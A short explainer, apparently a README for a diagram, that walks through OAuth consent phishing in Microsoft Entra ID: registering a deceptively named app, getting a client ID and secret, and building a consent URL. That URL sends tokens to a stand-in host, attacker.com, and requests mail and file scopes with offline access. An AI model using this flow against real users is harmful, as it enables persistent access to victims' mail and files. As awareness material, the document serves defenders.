# OAuth Redirect URI Abuse Flow

This diagram shows how attackers abuse the Redirect URI,
to capture and replay tokens in an OAuth consent phishing scenario.

![OAuth Redirect URI Abuse Flow](Images\MFAAttack.png)

🛠️ How Attackers Make the App

Registering the app

In Azure AD (Microsoft Entra ID),
anyone with a Microsoft account can go into App registrations and click New application.

They give it:

A name (e.g., “Secure PDF Viewer”).

A Redirect URI (where the tokens will be sent after login).

The permissions/scopes they want (e.g., Mail.Read, Files.Read.All, offline_access).

That’s all it takes.

No special approval unless the app requests very privileged scopes.

Getting Client ID + Secret

The portal generates a Client ID (like an app username).

The attacker generates a Client Secret (like an app password).

These are enough to interact with Microsoft’s OAuth endpoints.

Building the Consent URL

Attacker crafts a URL to Microsoft’s login service:

``` bash
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
   ?client_id=APP_ID
   &response_type=code
   &redirect_uri=https://attacker.com/callback
   &scope=Mail.Read Files.Read.All offline_access
   &prompt=consent

```

When the victim clicks, they see a real Microsoft login and consent screen.

Harvesting Tokens

After consent,
Microsoft’s system sends an auth code → refresh token to the redirect URI.

That’s how the attacker ends up with persistent access.
